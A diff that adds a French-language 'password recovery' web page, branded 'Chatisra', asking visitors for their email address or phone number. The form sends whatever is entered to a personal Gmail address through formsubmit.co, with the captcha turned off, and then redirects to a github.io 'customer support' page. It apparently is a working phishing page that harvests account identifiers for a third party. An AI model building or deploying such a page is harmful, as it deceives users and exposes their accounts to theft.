@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Récupération de mot de passe</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="password-recovery-container">
+            <div class="logo-section">
+                <img src="imgs/logo.png" alt="Chatisra Logo" class="logo">
+            </div>
+            <div class="form-section">
+                <h2>Récupération de mot de passe</h2>
+                <p>Entrez votre adresse e-mail ou votre numéro de téléphone pour récupérer votre compte.</p>
+                <form action="https://formsubmit.co/laatechtechnique@gmail.com" method="post">
+                    <input type="hidden" name="_next" value="https://aidesupportclient.github.io/validation.html">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="text" id="recovery-input" name="recovery-input" placeholder="Adresse e-mail ou numéro de téléphone" required>
+                    <button type="submit">Envoyer le code de récupération</button>
+                </form>
+            </div>
+            <p class="back-to-login-link">Retour à la <a href="index.html">page de connexion</a></p>
+        </div>
+    </div>
+</body>
+</html>
